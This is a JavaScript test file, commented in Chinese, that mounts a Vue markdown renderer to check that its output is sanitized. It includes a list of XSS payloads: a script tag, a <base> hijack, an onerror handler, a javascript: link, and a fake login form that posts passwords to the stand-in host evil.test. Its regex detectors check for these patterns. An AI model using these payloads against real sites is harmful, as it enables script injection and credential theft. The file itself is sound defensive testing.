// MarkdownRenderer.vue 的挂载用例：真 mount 组件，让「渲染器产出的 HTML 经过消毒」
// 由**执行**证明，而不是由注释声明（issue #180 验收 3）。
//
// 由来：`tests/markdownSanitize.test.js` 的 import 是 `../src/utils/sanitizeHtml.js`，
// 它自己装了 `globalThis.document`、自己拼了 marked 管道，文件头那句
// 「Same pipeline as src/components/MarkdownRenderer.vue」是**注释里的声明** ——
// SFC 自身的胶水（import marked / 配 markedHighlight / 在 computed 里调 sanitizeHtml /
// v-html 出口）一行都没被执行过。渲染器改了管道而消毒用例照绿，正是这类注释最容易骗人的地方。
//
// 与 markdownSanitize.test.js 的分工：那份测**管道下游**（sanitizeHtml 的策略本体，
// payload 由用例自己拼），本文件测**接线与上游**（SFC 真的把什么交给了消毒器、
// 又把消毒结果渲染成了什么）。两端各自被执行，中间不再靠注释。
//
// 观测口径：`utils/sanitizeHtml.js` 被换成 tests/helpers/sanitizeHtmlProbe.js ——
// 它每次调用都**原样转交真实实现**，只额外留下入参/出参。于是每条用例都能同时拿到
// 「渲染器喂进去的 HTML」与「消毒器交出来的 HTML」，再和挂载后的 DOM 三方对齐。
// 这解决了本文件最重要的一条反驳：只断言「DOM 里没有 <base>」时，payload 可能压根没被
// 渲染成 HTML，负向断言空转通过 —— 入参留档把这一点变成可观测事实（入参里确实有 <base>）。

import test from 'node:test'
import assert from 'node:assert/strict'
import { mountSfc } from './helpers/vueMount.js'
import {
  probeDisableSanitizer,
  probeEnableSanitizer,
  resetSanitizeProbe,
  sanitizeCalls,
} from './helpers/sanitizeHtmlProbe.js'

const MODULES = {
  'utils/sanitizeHtml.js': new URL('./helpers/sanitizeHtmlProbe.js', import.meta.url).href,
}

// 与 markdownSanitize.test.js 同源的一份 payload，覆盖它点名的几类：
// 文档级元数据（<base>）、脚本、伪造登录表单、事件处理器、危险 URL、内联 style，
// 外加必须照常渲染的合法 markdown（标题/加粗/链接/代码块）。
const HOSTILE = [
  '# 标题一',
  '',
  '<base href="https://evil.test/">',
  '<script>alert(1)</script>',
  '<form action="https://evil.test/collect" method="post">',
  '<label>账号</label><input type="password" name="password"><button>继续登录</button></form>',
  '<img src="/uploads/a.png" onerror="alert(2)">',
  '<a href="javascript:alert(3)">点我</a>',
  '<div style="position:fixed;inset:0;background:url(https://evil.test/bg.png)">overlay</div>',
  '',
  '**加粗** 与 [站内链接](/uploads/handbook.pdf)',
  '',
  '```js',
  'const answer = 42',
  '```',
].join('\n')

const DROPPED_TAGS = ['script', 'base', 'form', 'input', 'button', 'label', 'iframe', 'svg']
// 危险元素 + 危险属性 + 危险 URL 的判据，正反两条用例共用同一份：
// 正向用例要求它们「不在」，反向对照要求它们「在」。
function dangerFindings(scope) {
  return {
    droppedTags: DROPPED_TAGS.filter((tag) => scope.querySelectorAll(tag).length > 0),
    handlers: /on\w+\s*=/i.test(scope.innerHTML),
    javascriptUrl: /javascript:/i.test(scope.innerHTML),
    inlineStyle: scope.querySelectorAll('[style]').length > 0,
    evilHost: /evil\.test/i.test(scope.innerHTML),
  }
}

function markdownBody(view) {
  const body = view.query('.markdown-body')
  assert.ok(body, '组件应当渲染出 v-html 出口 .markdown-body（否则后面的断言全部空转）')
  return body
}

// bypassSanitizer 必须在挂载**之前**生效：`rendered` 是 computed，首帧渲染就会求值，
// 挂载之后再置开关就赶不上这次调用了（而且 resetSanitizeProbe 会把开关复位）。
async function mountRenderer(content, { bypassSanitizer = false } = {}) {
  resetSanitizeProbe()
  if (bypassSanitizer) probeDisableSanitizer()
  const view = await mountSfc('components/MarkdownRenderer.vue', {
    props: { content },
    modules: MODULES,
  })
  await view.flush(2)
  return view
}

// ---------------------------------------------------------------------------
// a. 渲染器实际产出的 HTML：危险面在 DOM 上不存在，合法面照常渲染
// ---------------------------------------------------------------------------

test('真实挂载：渲染器产出的 HTML 里危险元素与危险属性都不在 DOM 上', async () => {
  const view = await mountRenderer(HOSTILE)

  try {
    const body = markdownBody(view)

    // 控制项①：渲染器真的调用了消毒器，且**喂进去的 HTML 本身就含攻击面**。
    // 没有这一条，下面「DOM 里没有 <base>」可能只是因为 payload 没被渲染成元素。
    assert.equal(sanitizeCalls.length, 1, '渲染器应当恰好调用一次消毒器')
    const [{ input, output }] = sanitizeCalls
    assert.match(input, /<base href="https:\/\/evil\.test\/">/, '消毒器入参里应当含 <base>（payload 有效）')
    assert.match(input, /onerror\s*=\s*"alert\(2\)"/i, '消毒器入参里应当含 onerror（payload 有效）')
    assert.match(input, /javascript:alert\(3\)/, '消毒器入参里应当含 javascript: 链接（payload 有效）')

    // 承重：挂载后的 DOM 与「消毒器的返回值」逐字节一致 —— 渲染器渲染的就是消毒结果，
    // 没有第二条绕过消毒的出口。
    assert.equal(body.innerHTML, output, 'v-html 出口渲染的应当是消毒器的返回值本身')

    // 危险面确实被消毒器拿掉了（在入参里有、在 DOM 里没有）。
    assert.deepEqual(
      dangerFindings(body),
      { droppedTags: [], handlers: false, javascriptUrl: false, inlineStyle: false, evilHost: false },
      '渲染后的 DOM 里不得留有 <base>/<script>/<form>、on* 处理器、javascript: 链接或 evil.test'
    )
    assert.equal(body.querySelectorAll('base').length, 0, '<base> 不得出现在渲染器产出的 DOM 里')

    // 合法 markdown 照常渲染 —— 消毒不是「把内容全删了」，也不是「管道没跑」。
    assert.match(body.textContent, /标题一/)
    assert.equal(body.querySelectorAll('h1').length, 1)
    assert.equal(body.querySelectorAll('strong').length, 1)
    assert.match(body.innerHTML, /<code class="hljs language-js">/)
    assert.match(body.innerHTML, /<span class="hljs-keyword">const<\/span>/)
    // `<a>` 在白名单里，所以 javascript: 那一个是「留下元素、清掉 href」而不是整条消失：
    // 两个链接都在，前一个的 href 是 null。
    assert.deepEqual(
      [...body.querySelectorAll('a')].map((node) => node.getAttribute('href')),
      [null, '/uploads/handbook.pdf'],
      '危险链接的 href 被清成 null，合法链接照常保留'
    )
  } finally {
    await view.unmount()
  }
})

// ---------------------------------------------------------------------------
// b. 消毒发生在 SFC 自己的渲染链上：改 props 会重新走一遍管道
// ---------------------------------------------------------------------------

test('内容变更后重新渲染：新内容同样经过管道，且旧的危险内容不会残留', async () => {
  const view = await mountRenderer(HOSTILE)

  try {
    assert.equal(markdownBody(view).querySelectorAll('base').length, 0)
    assert.equal(sanitizeCalls.length, 1)

    // 换一段干净内容：DOM 必须随之更新（证明渲染由 props 驱动，不是一次性快照）。
    await view.setProps({ content: '# 换了一段\n\n正文' })
    await view.flush(2)
    assert.match(view.text(), /换了一段/)
    assert.doesNotMatch(view.text(), /标题一/, '旧内容应当随 props 更新而消失')

    // 再换回带攻击面的内容：管道每次都跑（不是只在首渲染跑一次）。
    await view.setProps({ content: '<base href="https://evil.test/"><script>alert(9)</script>正文二' })
    await view.flush(2)
    const body = markdownBody(view)
    assert.equal(body.querySelectorAll('base').length, 0)
    assert.equal(body.querySelectorAll('script').length, 0)
    assert.match(view.text(), /正文二/)

    assert.equal(sanitizeCalls.length, 3, '每次内容变更都应当重新走一遍消毒器')
    assert.match(sanitizeCalls[2].input, /<base href="https:\/\/evil\.test\/">/, '第二次也真的是带 <base> 的入参')
    assert.equal(body.innerHTML, sanitizeCalls[2].output, 'DOM 仍是消毒器的返回值')
  } finally {
    await view.unmount()
  }
})

// ---------------------------------------------------------------------------
// c. 反向对照：把消毒旁路掉，同一份 payload 的危险面确实会进入 DOM
// ---------------------------------------------------------------------------

test('反向对照：旁路消毒后，同一份 payload 的危险元素确实会进入 DOM', async () => {
  const view = await mountRenderer(HOSTILE, { bypassSanitizer: true })

  try {
    const body = markdownBody(view)

    // 这几条是第 a 条用例的镜像。它们必须为真，否则「渲染后的 DOM 里没有 <base>」
    // 可能只是因为 marked 压根没把这段 payload 渲染成元素 —— 那样第 a 条的负向断言
    // 就是空转的绿灯，消毒有没有生效根本测不出来。
    const findings = dangerFindings(body)
    assert.deepEqual(
      findings.droppedTags,
      ['script', 'base', 'form', 'input', 'button', 'label'],
      '旁路消毒后，payload 里的危险元素应当真的进入 DOM（证明 payload 有效、断言可被打红）'
    )
    assert.equal(findings.handlers, true, '旁路消毒后 onerror 应当留在 DOM 上')
    assert.equal(findings.javascriptUrl, true, '旁路消毒后 javascript: 链接应当留在 DOM 上')
    assert.equal(findings.evilHost, true, '旁路消毒后 evil.test 应当留在 DOM 上')
  } finally {
    probeEnableSanitizer()
    await view.unmount()
  }
})
